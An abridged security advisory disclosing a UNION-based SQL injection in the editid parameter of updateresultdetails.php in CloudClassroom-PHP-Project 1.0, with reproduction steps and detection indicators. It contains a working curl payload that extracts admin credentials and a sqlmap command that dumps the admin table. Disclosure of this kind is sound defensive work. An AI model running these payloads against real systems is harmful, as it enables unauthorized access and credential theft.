# Security Advisory — SQL Injection in updateresultdetails.php (parameter editid)

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-15**
...
A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **updateresultdetails.php**, that allows **an attacker (None (via Broken Access Control — item 00; design would require professor session); user interaction: None)** to exploit a **SQL Injection (UNION-based / error-based)** flaw.

Parameter `editid` is interpolated without quotes (numeric) in SELECT query. In numeric context allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.
...
| Component: updateresultdetails.php | 1.0 | None | Affected |
...
The vulnerability occurs due to **SQL Injection (UNION-based / error-based)** in the component **updateresultdetails.php**.
...
1. Request `updateresultdetails.php` with `editid` containing UNION payload (no cookie — item 00).
...
4. Automate with sqlmap (`-p editid`) for full database dump.
...
```text
File(s): updateresultdetails.php
Parameter(s): editid
...
<img width="1180" height="1042" alt="evidencia-web-15-updateresultdetails-sqli" src="https://github.com/user-attachments/assets/6f5b0805-f4f1-4c65-b500-41975bef2b15" />

**b) Vulnerable code line** (`updateresultdetails.php`):

<img width="2360" height="860" alt="evidencia-codigo-15-updateresultdetails-sqli" src="https://github.com/user-attachments/assets/264029a6-a8ef-4cd1-a956-7a00563faa93" />
...
```bash
curl -s -G "http://192.168.95.131:9292/updateresultdetails.php" \
  --data-urlencode "editid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/updateresultdetails.php?editid=1" -p editid --batch --dump -T admin
```
...
3. Access the component **updateresultdetails.php** (parameter(s): editid).
...
- Requests to `updateresultdetails.php` with `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes or `-- ` in parameter `editid`.
